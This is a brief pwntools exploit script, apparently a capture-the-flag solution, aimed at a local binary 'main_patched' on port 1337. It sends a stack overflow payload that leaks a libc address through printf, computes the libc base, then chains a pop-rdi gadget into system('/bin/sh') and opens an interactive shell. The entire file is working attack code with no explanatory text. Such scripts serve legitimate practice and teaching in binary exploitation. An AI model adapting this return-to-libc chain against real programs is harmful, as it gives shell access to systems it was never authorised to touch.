from pwn import *
context.arch = "amd64"
p = process("./main_patched")
p = remote("localhost", 1337)
elf = ELF("main_patched", checksec = False)
#libc = elf.libc
libc = ELF("./libc.so.6", checksec = False)
gift = p64(0x00000000004011f6) # mov rdi, QWORD PTR [rbp - 0x10]
leak = p64(0x400600 + 0x10) # pwndbg> search --pointer 0x404010
rdi = 0x00000000000240e5 # from libc
ret = 0x00000000000a6b7f
p.sendline(b"e" + b"A" * 15 + leak + gift + p64(elf.sym.printf) + p64(elf.sym.main)) # leak
p.recvuntil(b">>> ")
libc.address = u64(p.recv(6).ljust(8, b"\x00")) - libc.sym.getchar
print(hex(libc.address))
#gdb.attach(p)
p.sendline(b"e" + b"A" * 23 + p64(libc.address + rdi) + p64(next(libc.search(b"/bin/sh\x00"))) + p64(libc.sym.system)) # system("/bin/sh")

p.interactive()
